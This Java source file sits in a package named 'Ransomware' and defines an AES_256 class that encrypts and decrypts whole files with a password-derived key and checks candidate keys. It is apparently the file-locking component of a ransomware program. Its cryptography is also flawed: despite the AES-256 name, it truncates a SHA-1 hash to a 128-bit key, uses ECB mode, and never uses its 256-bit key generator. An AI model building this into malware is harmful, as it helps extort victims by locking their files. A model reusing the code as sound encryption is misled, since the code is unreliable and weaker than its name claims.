package Ransomware;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class AES_256 {
    private static SecretKeySpec secretKey;
    private static byte[] key;

    public static void setKey(String myKey) {
        MessageDigest sha;
        try {
            key = myKey.getBytes(StandardCharsets.UTF_8);
            sha = MessageDigest.getInstance("SHA-1");
            key = sha.digest(key);
            key = Arrays.copyOf(key, 16);
            secretKey = new SecretKeySpec(key, "AES");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }
    public static String keyToString(SecretKey key){
        return Base64.getEncoder().encodeToString(key.getEncoded());
    }
    public static SecretKey generateKey() throws NoSuchAlgorithmException {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(256);
        return keyGen.generateKey();
    }
    public static void encrypt(File inputFile, File outputFile,String secret) {
        doJob(inputFile,outputFile,"AES/ECB/PKCS5Padding",1,secret);
    }
    public static void decrypt(File inputFile, File outputFile,String secret) {
        doJob(inputFile,outputFile,"AES/ECB/PKCS5PADDING",2,secret);
    }
    public static boolean checkKey(String key, File file) throws IOException {
        FileInputStream inputStream = new FileInputStream(file);
        try{
            setKey(key);
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5PADDING");
            cipher.init(Cipher.DECRYPT_MODE, secretKey);


            byte[] inputBytes = new byte[(int) file.length()];
            inputStream.read(inputBytes);

            cipher.doFinal(inputBytes);
            inputStream.close();
            return true;
        }catch(Exception wrongKey){
            System.out.println("Error while encrypting/decrypting: ");
            inputStream.close();
            return false;
        }

    }
    public static void doJob(File inputFile, File outputFile,String instance,int mode,String secret){
        try{
            setKey(secret);
            Cipher cipher = Cipher.getInstance(instance);
            cipher.init(mode, secretKey);

            FileInputStream inputStream = new FileInputStream(inputFile);
            byte[] inputBytes = new byte[(int) inputFile.length()];
            inputStream.read(inputBytes);

            byte[] outputBytes = cipher.doFinal(inputBytes);

            FileOutputStream outputStream = new FileOutputStream(outputFile);
            outputStream.write(outputBytes);

            inputStream.close();
            outputStream.close();
        }catch(Exception wrongKey){
            System.out.println("Error while encrypting/decrypting: " + wrongKey);
        }

    }
}